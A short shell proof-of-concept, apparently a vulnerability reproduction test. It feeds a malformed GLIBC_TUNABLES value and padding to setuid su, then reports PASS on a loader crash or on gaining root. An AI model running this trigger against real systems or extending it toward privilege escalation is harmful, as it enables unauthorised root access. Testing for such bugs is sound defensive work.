#!/bin/sh

set -u
padding=$(printf '%08192x' 1)

set +e
env -i \
  'GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A' \
  "Z=$padding" \
  /usr/bin/su --help >/tmp/poc.stdout 2>/tmp/poc.stderr
status=$?
set -e

cat /tmp/poc.stdout
cat /tmp/poc.stderr >&2

echo
echo '[*] Privilege status after PoC:'
id
printf 'real UID     : '; id -ru
printf 'effective UID: '; id -u

if [ -r /proc/self/status ]; then
  grep '^Cap\(Inh\|Prm\|Eff\|Bnd\|Amb\):' /proc/self/status || true
fi

if [ "$(id -u)" -eq 0 ]; then
  echo '[PASS] privilege escalation evidence: effective UID is 0 (root)'
else
  echo '[INFO] no privilege escalation: effective UID is not 0'
fi

if [ "$status" -eq 139 ]; then
  echo "[PASS] vulnerable ld.so crashed with SIGSEGV (exit 139)"
  exit 0
fi

echo "[FAIL] expected exit 139, got $status" >&2
exit 1